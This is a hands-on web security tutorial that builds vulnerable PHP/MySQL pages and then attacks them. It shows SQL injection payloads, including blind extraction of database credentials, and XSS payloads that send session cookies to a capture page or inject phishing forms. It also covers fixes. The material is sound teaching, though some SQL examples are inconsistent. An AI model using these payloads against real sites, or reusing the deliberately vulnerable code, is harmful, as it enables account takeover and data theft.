--- 
layout: default
title: "Web Security - Hands on"
---

# Web Security - Hands-on

The content of this page largely taken and adapted from Andrea Valenza's [Cyber-Gym](https://github.com/AvalZ/cyber-gym))

## Requirements
- HTTP Protocol

	- Sending Parameters over HTTP

- Technologies

	- HTML (CSS is optional)

		- JavaScript
		- Running a simple embedded script

	- PHP

	    - Read parameters from requests
		- Simple output
		- Fetch data from MySQL DB

	- SQL

		- Simple queries

## Virtual Machine

- [Vagrant](https://www.vagrantup.com/)

	- [ScotchBox](https://box.scotch.io/) - A simple LAMP stack for Vagrant 
	- pre-built: https://github.com/AvalZ/cyber-gym

- or build a custom VM (VMWare or Virtualbox) with:

	- Ubuntu (any Debian-based Linux distro will do)
	- LAMP Stack installed, which means:
	- Linux
	- Apache
	- MySQL
	- PHP

## Hello World!

Open a hello.php file in your Root Web folder
```
<?php echo "Hello World!";?>
```
Go to your favorite Browser
Open `<IP>/hello.php`

## Read GET parameters
1. Copy `hello.php` in `hello2.php` (we don’t want to lose all that hard work, do we?)
2. Get the `GET` parameters
```
$firstname = $_GET["firstname"];
$lastname = $_GET["lastname"];
```
3. Echo the salutation:
```
echo "Hello $firstname $lastname!";
```
WARNING: the “variable in a string” trick will work ONLY with double quotes! (long story…)
4. Load the page from the browser:
```
.../hello2.php?firstname=John&lastname=Doe
```
Should display `Hello John Doe!`

## Simple HTML Form
Tired of writing everything in that tiny URL box? Let’s switch to forms!
```
<html>
<form action="hello2.php">
Nome<input type="text" name="firstname"><br/>
Cognome<input type="text" name="lastname"><br/>
<input type="submit" value="Submit">
</form>
</html>
```
Be careful: the field names must be the same as in the HTTP request!
Point it to the PHP page that displays “Hello firstname lastname!”

## SQL Basics
- SELECT

	- FROM
	- WHERE
	- LIMIT
	- ORDER BY / GROUP BY

- INSERT
- UPDATE
- DELETE

If you don’t know what one (or more) of these does, stop reading and Google it!

## Stacked queries
![Mom exploit](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)

- Query: 	`SELECT * FROM Students WHERE(name='$name')`
- Payload: 	`Robert'); DROP TABLE Students;-- `

SELECT * FROM Students WHERE(name=’Robert’); DROP TABLE Students;-- ’)

No library will ever let you do this anymore, only 1 query at a time (but nesting is ok!) ]

## Creating a SQL Database
Go to your MySQL Interpreter (either CLI, MySQL Workbench, or PHP)
CREATE DATABASE websec;
Now create a table inside it
CREATE TABLE websec.users (	id int NOT NULL AUTO_INCREMENT,	username varchar(100) NOT NULL,	password varchar(100),	signature varchar(255),	PRIMARY KEY (id));^  Sad SQL syntax is sad

Add some data in your table
INSERT INTO users (first_name,last_name,signature)	VALUES (‘Arthur’, ‘Bathrobe’, ‘Is there any tea on this spaceship?’);
INSERT INTO users (first_name,last_name,signature)	VALUES (‘Ford’, ‘Betelgeuse’, ‘Don\’t panic... don\’t panic...’);
NOTE: quotes are escaped by doubling, not one double-quote, but two single-quotes
“But everyone told us not to store passwords as plaintext”
They were right, but did they tell you what you should use?
Not important right now, this will be a topic for another lesson
Creating a SQL Database

HTML Form with:
<form action=’login.php’ method=’POST’>
    <input type=’text’ name=’user’>
    <input type=’password’ name=’pass’>
Form should POST credentials to PHP page
$user = $_POST[‘user’];
$pass = $_POST[‘pass’];
PHP page should check if user exists
$con->query(“SELECT * FROM users WHERE username=’$user’ AND password=’$pass’”);
num_rows > 0: display welcome message
else: display error message
Login Form

Login Form - EXPLOIT 
Can you login as ‘Arthur’ without knowing his password?
Query:	SELECT * FROM users WHERE username=’$user’ AND password=’$pass’
Payload:
username:		Arthur’ -- -
password: 		anything

Why does this work?
SELECT * FROM users WHERE username=’Arthur’ -- -’ AND password=’anything’
SELECT * FROM users WHERE username=’Arthur’ -- -’ AND password=’anything’										(this is all commented out)


Login Form - EXPLOIT 
What if you don’t know any username?
Query:	SELECT * FROM users WHERE username=’$user’ AND password=’$pass’
Payload:
username: 		any
password: 		a’ OR ‘b’=’b
Why does this work?
SELECT * FROM users WHERE username=’any’ AND password=’a’ OR ‘b’=’b’
SELECT * FROM users WHERE username=’any’ AND password=’a’ OR ‘b’=’b’
SELECT * FROM users WHERE ( username=’any’ AND password=’a’ ) OR ‘b’=’b’
Why did we inject the password field here? (Hint: operator precedence)
(If you have a 40+ year old Facebook friend, you’ve seen plenty of that)

Login Form - EXPLOIT 
What if you don’t know any username AND the page checks for one result?
Query:	SELECT * FROM users WHERE username=’$user’ AND password=’$pass’
Payload:
username: 		any
password: 		a’ OR True LIMIT 3,1 -- -
Why does this work?
SELECT * FROM users WHERE username=’any’ AND password=’a’ OR True LIMIT 3,1 -- -’
SELECT * FROM users WHERE username=’any’ AND password=’a’ OR True LIMIT 3,1 -- -’
SELECT * FROM users WHERE (( username=’any’ AND password=’a’ ) OR True) LIMIT 3,1 -- -’

Get Data from MySQL DB
Query String 
$payload = $_GET[‘payload’]; // or you could use $_POST[‘payload’] if you wish
“SELECT * FROM users WHERE username=’$payload’”
Submit string to DB
Call ->query method on open connection
Iterate over results cursor
Use ->fetch_assoc(), it will return a row as an associative array
Display all results
echo $row[‘user’] . $row[‘pass’] . $row[‘signature’];  // Formatting is for tryhards
Display SQL errors on the Result page
$con->error

Get Data from MySQL DB - EXPLOIT
Always True WHERE clause
Query:		SELECT * FROM users WHERE username=’$payload’
Payload: 		Arthur’ OR ‘a’=’a
SELECT * FROM users WHERE username=’Arthur’ OR ‘a’=’a’
SELECT * FROM users WHERE username=’Arthur’ OR ‘a’=’a’

“But what if I wanted to get data from another table?”

Get Data from MySQL DB - EXPLOIT
UNION Based SQL Injection
Query:		SELECT * FROM users WHERE username=’$payload’
Payload: 		Arthur’ UNION ALL SELECT user AS username, null AS id,password AS			password,NULL FROM mysql.user -- -
SELECT * FROM users WHERE username=’Arthur’ UNION ALL SELECT user AS username, null AS id,password AS password,NULL FROM mysql.user -- -’
SELECT * FROM users WHERE username=’Arthur’UNION ALLSELECT user AS username, 0 AS id, password AS password, NULL FROM mysql.user -- -’
NOTE: column number must be the same in both queries (hence the NULL value)

Get Data from MySQL DB - EXPLOIT
Error Based SQL Injection
Query:		SELECT * FROM users WHERE username=’$payload’
Payload: 		Arthur’ AND ExtractValue(0, CONCAT( 0x5c, User() ) ) -- -
SELECT * FROM users WHERE username=’Arthur’ 		AND ExtractValue(0, CONCAT( 0x5c, User() ) ) -- -’
0x5c is the \ character in ASCII
SELECT * FROM users WHERE username=’Arthur’ AND ExtractValue(0, \user@host ) ) -- -’
SQL is ‘eager’, User() is substituted by its result (user@host) when evaluated 
ExtractValue takes two parameters:
An XML document (as a String)
An XPath (no XPath starts with ‘\’    =>   syntax error ensured, but that’s what we want)

Recap
Server-side attacks
SQL Injection
Stacked queries
Login Bypass
“Always True” clause
UNION Based SQL Injection
Error Based SQL Injection

Get Data from MySQL DB - FIX
mysql_real_escape_string
$payload = mysql_real_escape_string($_POST[‘payload’]);
This function sanitizes the string and doesn’t let you perform injections… 
… or does it??? <insert evil laugh>
It actually does for this particular code, but be careful:
NO SILVER BULLET
How does mysql_real_escape_string work?
[From PHP man page] calls MySQL's library function mysql_real_escape_string, which prepends backslashes to the following characters:\x00, \n, \r, \, ', " and \x1a (SUB or Ctrl-Z).
How about those nasty --, %, etc.?
Only escapes MySQL string terminators -> It won’t let you close a string
The character set must be set either at the server level, or with the API function mysql_set_charset() for it to affect mysql_real_escape_string()

Display user info
We need a page to display information on a single user
$id = mysql_real_escape_string($_GET[‘id’]); // what could go wrong? I’m sanitizing!!!
“SELECT * FROM users WHERE id=$id” // no quotes around $id since it’s an integer value
Submit string to DB
Call ->query method on open connection
Check for results (might be an empty set)
Get the resulting row (should only be one, since id is a UNIQUE field)
Display information about the selected user
echo $row[‘user’] . $row[‘signature’];  // Formatting keeps being for tryhards
DON’T display SQL errors directly (we don’t want Error-based injections)
echo “Something went wrong *insert witty joke here*”;

Display user info - EXPLOIT
Normal query  (with existing id)
Query:		SELECT * FROM users WHERE id=$id 
Payload: 		1
SELECT * FROM users WHERE id=1
“WTF??? No quotes? Can you even do that???”
Yes, you can
“But then… what about string terminators? I don’t need one to close the argument”
PATIENCE YOU MUST HAVE, my young padawan
Displays user informations
Name: 		Arthur
Signature: 		Is there any tea on this spaceship?

Display user info - EXPLOIT
Normal query  (with non-existing id)
Query:		SELECT * FROM users WHERE id=$id
Payload: 		404
SELECT * FROM users WHERE id=404
(still no quotes here, Yoda saying wise stuff again)
Display an error message
User not found

Display user info - EXPLOIT
“Always” true query (id must exist)
Query:		SELECT * FROM users WHERE id=$id
Payload: 		1 AND True
SELECT * FROM users WHERE id=1 AND True
Displays user informations
Name: 		Arthur
Signature: 		Is there any tea on this spaceship?

Display user info - EXPLOIT
Always false query
Query:		SELECT * FROM users WHERE id=$id
Payload: 		1 AND False
SELECT * FROM users WHERE id=1 AND False
Displays error message
User not found

Display user info - EXPLOIT
Blind Injections
The result page can’t display any additional information
It can only answer YES or NO (in our page: “user info” or “no user found”)
We know that Left-hand-side argument of our AND is true (id=1)
but what about the Right-hand-side?
AND True
True if left-hand-side is True 		True AND True => True
AND False
Always False					(anything) AND False => False
Or we could reconstruct it, by knowing the page Result (and assuming left-hand-side = True)
True AND X = (Page result)
if X were True,					True AND X => True AND True => YES
If X were False,					True AND X => True AND False => NO

Display user info - EXPLOIT
Boolean-Based Blind Injections
Brute Force
The value of X can be inferred from the page output, but it can’t be read directly
If X is some generic condition, we can evaluate it and get True or False
…  AND LENGTH(password)>2 
[For the examined user] Evaluate if the password field is longer than 2 characters
If it is, the page will display user information as usual
If it isn’t, the page will display an error message (user not found)
We can now ask questions to our DB, but it can only answer YES or NO
We need to be smart about this, let’s try something: 
… AND password=”a”			=> NO
… AND password=”aa”		=> NO
… ok, this will get us nowhere, we need to try something smarter

Display user info - EXPLOIT
Boolean-Based Blind Injections
“Smarter” Brute Force - Step 1
First, we get the password field length
Query:		SELECT * FROM users WHERE id=$id
Payload: 		1 AND LENGTH(password)=1			1 AND LENGTH(password)=2			…
SELECT * FROM users WHERE id=1 AND LENGTH(password)=1		=> NO
SELECT * FROM users WHERE id=1 AND LENGTH(password)=2		=> NO
…
SELECT * FROM users WHERE id=1 AND LENGTH(password)=8		=> YES

Display user info - EXPLOIT
Boolean-Based Blind Injections
“Smarter” Brute Force - Step 2 ver.0
Now that we have the length, we can bruteforce on strings of that length
Uppercase and Lowercase
Query:		SELECT * FROM users WHERE id=$id
Payload: 		1 AND password=”aaaaaaaa”			1 AND password=”aaaaaaab”			…
SELECT * FROM users WHERE id=1 AND password=”aaaaaaaa”		=> NO
…
SELECT * FROM users WHERE id=1 AND password=”Bathrobe”		=> YES	But this would take AGES! We can do much better than that!

Display user info - EXPLOIT
Boolean-Based Blind Injections
Smarter Brute Force (linear search) - Step 2 ver.1
If we have the length, we can slice the password and find each character by itself
We go from 94^8 to 94*8 (case-insensitive printable ASCII characters except space)
Query:		SELECT * FROM users WHERE id=$id
Payload: 		1 AND MID(password,1,1)=”a”			1 AND MID(password,1,1)=”b”			…
SELECT * FROM users WHERE id=1 AND MID(password,1,1)=”a”		=> NO
…
SELECT * FROM users WHERE id=1 AND MID(password,1,1)=”B”		=> YES	Then we move to the second character with MID(password, 2,1) and so on.

Display user info - EXPLOIT
Boolean-Based Blind Injections
Smarter Brute Force (binary search) - Step 2 ver.2
Since ASCII is sorted, we can binary search it
O(n) to O(log(n)) and that kind of weird stuff… bottom line: it’s faster than linear search
Query:		SELECT * FROM users WHERE id=$id
Payload: 		1 AND ORD(MID(password,1,1))>64 			1 AND ORD(MID(password,1,1))>96			…
SELECT * FROM users WHERE id=1 AND ORD(MID(password,1,1))>64
NO 	=> 	SELECT * FROM users WHERE id=1 AND ORD(MID(password,1,1))>32
YES 	=> 	SELECT * FROM users WHERE id=1 AND ORD(MID(password,1,1))>96	For each character in the password field

Display user info - EXPLOIT
Boolean-Based Blind Injections
But what if you wanted to extract data from another table?
Nested queries
Query:		SELECT * FROM users WHERE id=$id
Payload: 		1 AND ORD(MID( (SELECT user FROM mysql.user LIMIT 0,1) ,1,1))>64			1 AND ORD(MID( (SELECT user FROM mysql.user LIMIT 0,1) ,1,1))>96			…
SELECT * FROM users WHERE id=1 AND ORD( MID(		(SELECT user FROM mysql.user LIMIT 0,1), 1, 1 ))>64
SELECT * FROM users WHERE id=1 AND ORD( MID(					“root”				       , 1, 1 ))>64

Login Form
Let’s refine our login form to really keep track of logged users
start_session();
$_SESSION[‘user’] = $user;
$_SESSION[‘id’] = $row[‘id’];
echo “Welcome {$_SESSION[‘user’]}!”;
Sessions are indexed by PHPSESSID (the “HTTP is Stateless” mantra)

Private Messaging System
Create a Message table
CREATE TABLE websec.messages (	id int NOT NULL AUTO_INCREMENT,	from_id int NOT NULL,	to_id int NOT NULL,	content varchar(255),	PRIMARY KEY (id),	FOREIGN KEY (from_id) REFERENCES websec.users(id),	FOREIGN KEY (to_id) REFERENCES websec.users(id));
Insert a message
INSERT INTO websec.messages (from_id, to_id, content) VALUES (1, 2, ‘Hi Ford!’);

Private Messaging System
Select all received messages by the logged user (the “elegant” way)
SELECT	m.id AS “id”;	u1.username AS “from”,	u2.username AS “to”,	m.contentFROM	messages m	INNER JOIN users u1		ON m.from_id=u1.id	INNER JOIN users u2		ON m.to_id=u2.idWHERE m.to_id={ $_SESSION[‘id’] }		// we need start_session() in this page

Private Messaging System
Insert a message (being logged as Arthur, id is 1)
Time-based Blind Injection
Query:		INSERT INTO websec.messages (from_id, to_id, content) 				VALUES ({$_SESSION[‘id’]}, $to, ‘Hi Ford!’);
Payload: 		2
INSERT INTO websec.messages (from_id, to_id, content) VALUES (1, 2, ‘Hi Ford!’)
Displays a static message
Message sent
We’re not checking for existing users right now, hence the “static” message

Private Messaging System - EXPLOIT
Inserting a message (being logged as Arthur, id is 1)
Time-based Blind Injection
Query:		INSERT INTO websec.messages (from_id, to_id, content) 				VALUES ({$_SESSION[‘id’]}, $to, ‘Hi Ford!’);
Payload: 		SLEEP(10)
INSERT INTO websec.messages (from_id, to_id, content) 	VALUES (1, SLEEP(10), ‘Hi Ford!’)
Displays a static message
[ wait for ~10 seconds ]   <- this is how we can simulate a boolean-based blind
Message sent

Private Messaging System - EXPLOIT
Inserting a message (being logged as Arthur, id is 1)
Time-based Blind Injection
Query:		INSERT INTO websec.messages (from_id, to_id, content) 				VALUES ({$_SESSION[‘id’]}, $to, ‘Hi Ford!’);
Payload: 		IF ( ORD(MID((SELECT user FROM mysql.user LIMIT 0,1) ,1,1))>64,				SLEEP(10),				SLEEP(0) )
INSERT INTO websec.messages (from_id, to_id, content) VALUES (1, IF..., ‘Hi Ford!’)
Displays a static message
[ wait for ~10 seconds ]   <- this is how we can simulate a boolean-based blind
Message sent

Recap
Server-side attacks
SQL Injection
Stacked queries
Login Bypass
“Always True” clause
UNION Based SQL Injection
Error Based SQL Injection
Blind SQL Injection
Boolean-based Blind
Brute force
Linear Search
Binary Search
Time-based Blind
Prepared Statements

Handling passwords in your DB
Plaintext passwords
Attackers can steal login credentials
Ciphered passwords (but how?)
MD5											Tool: John the Ripper
Can be guessed using		Dictionary Attack
Easily “reversible” 		Collision Attack
SHA-1
Reversible using 		Rainbow Tables
SHA-1  +  Salt
Rainbow tables exist for simple salts
BCrypt
Based on Blowfish cipher
Double salting: simple concatenated salt + number of iterations
All saved in-format (no need for another column)

Private Messaging System - FIX
Context awareness (we’re sanitizing integers as strings)
mysql_real_escape_string does not escape non-string arguments
but we can still “cast” a value to Integer
$safe_id = (int)$id
Completely avoid mixing Code and Data
Prepared Statements
Prepare a query	$stmt = $con->prepare(“SELECT * FROM users WHERE id=?”);
Bind parameters		$stmt->bind(“i”, $id);
Execute the query	$stmt->execute();

Recap
Server-side attacks
SQL Injection
Stacked queries
Login Bypass
“Always True” clause
UNION Based SQL Injection
Error Based SQL Injection
Blind SQL Injection
Boolean-based Blind
Brute force
Linear Search
Binary Search
Time-based Blind
Prepared Statements

So we’re done! ... right?
We avoided server-side attacks! Yay!
… but what about the users?
Remember that “Read GET parameters” slide?
Did we see a “Read GET parameters - EXPLOIT”?
“Well, no… but how can we exploit such a simple script?”

Read GET parameters - EXPLOIT
XSS Reflected (a.k.a. “why would I ever attack myself?”)
You may use the Simple HTML Form, if you wish (and please, use Firefox for this part)
Code: 			$firstname = $_POST[‘firstname’];				$lastname = $_POST[‘lastname’];				echo “Hello $firstname $lastname!”;
Payload:
firstname:		John
lastname:		Doe
Output: 		Hello John Doe

Read GET parameters - EXPLOIT
XSS Reflected
We can try adding some HTML to our parameters and see if the page renders it
Code: 			$firstname = $_POST[‘firstname’];				$lastname = $_POST[‘lastname’];				echo “Hello $firstname $lastname!”;
Payload:
firstname:		<i>John</i>
lastname:		<u>Doe</u>
Output: 		Hello John Doe!

Read GET parameters - EXPLOIT
XSS Reflected
Form Injection
By adding custom HTML, we can try and go for a Phishing Attack
Code: 			$firstname = $_POST[‘firstname’];				$lastname = $_POST[‘lastname’];				echo “Hello $firstname $lastname!”;
Payload:
firstname:		<form action=”http://www.mysite.it/capture_page.php”>				Username: <input name=”user” type=”text”/><br/>
lastname:			Password: <input name=”pass” type=”password”/>			</form>
Output: 		Hello [ Fake login form ]!

Read GET parameters - EXPLOIT
XSS Reflected
That was nice, but let’s see how far we can go!
Code: 			$firstname = $_POST[‘firstname’];				$lastname = $_POST[‘lastname’];				echo “Hello $firstname $lastname!”;
Payload:
firstname:		John
lastname:		Doe<script>alert(1)</script>
Output: 		Hello John Doe[ … popup appears saying “1” … ]!		

Read GET parameters - EXPLOIT
XSS Reflected
That “1” wasn’t so exciting, is there anything important we can display from the DOM?
Remember your “HTTP is Stateless” mantra? What makes it Stateful?
Code: 			$firstname = $_POST[‘firstname’];				$lastname = $_POST[‘lastname’];				echo “Hello $firstname $lastname!”;
Payload:
firstname:		John
lastname:		Doe<script>alert(document.cookie)</script>
Output: 		Hello John Doe[ … popup appears saying “PHPSESSID=badf00d...” … ]!		

Read GET parameters - EXPLOIT
XSS Reflected
Reading cookies is cool! But what about making the page perform some action?
Code: 			$firstname = $_POST[‘firstname’];				$lastname = $_POST[‘lastname’];				echo “Hello $firstname $lastname!”;
Payload:
firstname:		John
lastname:		Doe<script>window.location=’www.google.it’</script>
Output: 		Hello John Doe[ redirect to www.google.it ]	

Read GET parameters - EXPLOIT
XSS Reflected
Session Hijack (stealing cookies)
I could send my* cookies somewhere!   *Cookies may actually not be mine.
Code: 			$firstname = $_POST[‘firstname’];				$lastname = $_POST[‘lastname’];				echo “Hello $firstname $lastname!”;
Payload:
firstname:		John
lastname:		Doe<script> window.location=’http://192.168.33.10/support				/capture_page.php?’ + document.cookie; </script>
Output: 		Hello John Doe[ redirect to http://192.168.33.10, while sending the Cookie ]				REMEMBER: GET requests send parameters too

Read GET parameters - EXPLOIT
XSS Reflected
Session Hijack (covert)
But can’t we do it without redirection?
Code: 			$firstname = $_POST[‘firstname’];				$lastname = $_POST[‘lastname’];				echo “Hello $firstname $lastname!”;
Payload:
firstname:		John
lastname:		Doe<script> new Image().src=’http://192.168.33.10/support				/capture_page.php?’ + document.cookie; </script>
Output: 		Hello John Doe[ broken image link ]!				Browsers automatically perform GET requests to “src” URLs!!

Read GET parameters - FIX
Block <script> tags
We could just remove the “script” tags, so that no JavaScript code can be executed!
Code: 			$firstname = preg_replace("/script/i", "", $_POST[‘firstname’]);				$lastname = preg_replace("/script/i", "", $_POST[‘lastname’]);				echo “Hello $firstname $lastname!”;
Payload:
firstname:		John
lastname:		Doe<script> new Image().src=’http://192.168.33.10/support				/capture_page.php?’ + document.cookie; </script>
Output: 		Hello John Doe<>new Image().src=’http://192.168.33.10/support				/capture_page.php?’ + document.cookie;!

Read GET parameters - EXPLOIT
XSS Reflected - Bypass <script> tags block
Can we ONLY insert JavaScript code in <script> tags?
Not ONLY that: HTML elements have on* attributes (onload, onerror, … )
Code: 			$firstname = preg_replace("/script/i", "", $_POST[‘firstname’]);				$lastname = preg_replace("/script/i", "", $_POST[‘lastname’]);				echo “Hello $firstname $lastname!”;
Payload:
firstname:		John
lastname:		Doe<svg onload=”new Image().src=’http://192.168.33.10/support				/capture_page.php?’ + document.cookie”></svg>
Output: 		Hello John Doe [ broken image link ]!				Just like before!

Read GET parameters - FIX
XSS Reflected - Chrome XSS Auditor
Why did we have to work on Firefox? Can’t we work on Chrome?
Code: 			$firstname = preg_replace("/script/i", "", $_POST[‘firstname’]);				$lastname = preg_replace("/script/i", "", $_POST[‘lastname’]);				echo “Hello $firstname $lastname!”;
Payload:
firstname:		John
lastname:		Doe<svg onload=”new Image().src=’http://192.168.33.10/support				/capture_page.php?’ + document.cookie”></svg>
Output: 		Hello John Doe!		[ script blocked in Console ]				Scripts found in GET parameters are blocked! Are we done then?

Read GET parameters - EXPLOIT
XSS Reflected - Bypassing Chrome XSS Auditor
Chrome only checks if a parameter appears in the HTML Body too
If it appears in a parameter and in the body, Chrome blocks its execution
Code: 			$firstname = preg_replace("/script/i", "", $_POST[‘firstname’]);				$lastname = preg_replace("/script/i", "", $_POST[‘lastname’]);				echo “Hello $firstname $lastname!”;
Payload:
firstname:		John
lastname:		Doe<svscriptg onlscriptoad=”new Image().src=’http://192.168.33.10				/support/capture_page.php?’ + document.cookie”></svscriptg>
Output: 		Hello John Doe [ broken image link ]!				Scripts are not the same!! (php modified it) so Chrome renders it

Read GET parameters - EXPLOIT
XSS Reflected - Bypassing Chrome XSS Auditor
Chrome only checks if a parameter appears in the HTML Body too
It checks for each parameter, but doesn’t cross-check! ( … bad pun intended)
Code: 			$firstname = $_POST[‘firstname’];	  // removing script is useless … 				$lastname = $_POST[‘lastname’];	  // no need for it now				echo “Hello $firstname $lastname!”;
Payload:
firstname:		John<svg onload=”
lastname:		alert(‘gotcha!’)”>Doe
Output: 		Hello John[ … popup saying “gotcha!” …  ]Doe!				Each parameter is checked on its own! No match = rendered

Private Messaging System - EXPLOIT
XSS Stored
Chrome XSS Auditor won’t work here, it only checks for GET parameters
Code: 			echo “From: <b>{$row[‘from’]}</b> &lt; {$row[‘content’]}”;					// Next level HTML inline templates  :V					// Don’t try this at home (or even worse, at work)
Payload:			|  id	|	from		|	to	|		content		|				|   2	|  	Ford		|    Arthur	|    Hi Arthur! How are you?	|				|   5	|	Ford		|    Arthur	|    Sure!				|
Output: 			From: Ford > Hi Arthur! How are you?				From: Ford > Sure!

Private Messaging System - EXPLOIT
XSS Stored
A simple XSS: this one is just annoying, not really malicious
Code: 			echo “From: <b>{$row[‘from’]}</b> &lt; {$row[‘content’]}”;					
Payload:			|  id	|	from		|	to	|		content		|				|   2	|  	Ford		|    Arthur	|    Hi Arthur! How are you?	|				|   5	|	Ford		|    Arthur	|    <script>alert(1)</script>	|
Output: 			From: Ford > Hi Arthur! How are you?				From: Ford > [ … popup appears saying “1” … ]

Private Messaging System - EXPLOIT
XSS Stored
iFrame Injection
Code: 			echo “From: <b>{$row[‘from’]}</b> &lt; {$row[‘content’]}”;					
Payload:			|  id	|	from		|	to	|		content		|				|   2	|  	Ford		|    Arthur	|    Hi Arthur! How are you?	|				|   5	|	Ford		|    Arthur	| <iframe src="..."></iframe>	|
Output: 			From: Ford > Hi Arthur! How are you?				From: Ford > [ a frame with the target (src) website in it ]

Private Messaging System - EXPLOIT
XSS Stored
CSRF - Cross-Site Request Forgery
Make your victim perform an arbitrary action
Code: 			echo “From: <b>{$row[‘from’]}</b> &lt; {$row[‘content’]}”;					
Payload:			|  id	|	from		|	to	|		content		|				|   2	|  	Ford		|    Arthur	|    Hi Arthur! How are you?	|				|   5	|	Ford		|    Arthur	| 	<img src="..."/>		|
Output: 			From: Ford > Hi Arthur! How are you?				From: Ford > [ a GET action is automatically performed ]

Private Messaging System - FIX
htmlspecialchars($string, ENT_QUOTES, 'UTF-8')
We have to sanitize all outputs to the client
Code: 			$from = htmlspecialchars($row[‘from’]);							$content = htmlspecialchars($row[‘content’]);				echo “From: <b>$from</b> &lt; $content”;	
Payload:			|  id	|	from		|	to	|		content		|				|   2	|  	Ford		|    Arthur	|    Hi Arthur! How are you?	|				|   5	|	Ford		|    Arthur	|    <script>alert(1)</script>	|
Output: 			From: Ford > Hi Arthur! How are you?				From: Ford > <script>alert(1)</script>  (NOT RENDERED!! WOAH!!)

Recap
Server-side attacks
SQL Injection
Stacked queries
Login Bypass
“Always True” clause
UNION Based SQL Injection
Error Based SQL Injection
Blind SQL Injection
Boolean-based Blind
Brute force
Linear Search
Binary Search
Time-based Blind
Prepared Statements
Client-side attacks
XSS
XSS Reflected
Form Injection
Session Hijack
Session Hijack (covert)
Bypass XSS Auditor
XSS Stored
iFrame Injection
CSRF
Sanitization

APPENDIX A - Information Gathering
Path Traversal
http://www.mysite.it/index.php?page=contacts
Code: 		// index.php				<?php					require_once __DIR__.“/pages/”.$_GET[‘page’];
Output: 		<html>				<head> <title>Our Contacts</title> </head>				<body>...</body>			</html>

APPENDIX A - Information Gathering
RFI - Remote File Inclusion
http://www.mysite.it/index.php?page=PD9waHAgZWNobyAnYWxsb3dfdXJsX2luY2x1ZGUgaXMgYmFkJzs=
Code: 		// index.php				<?php					require_once __DIR__.“/pages/”.$_GET[‘page’];
Output: 		<html>				<head> <title>Our Contacts</title> </head>				<body>...</body>			</html>allow_url_include must be ON
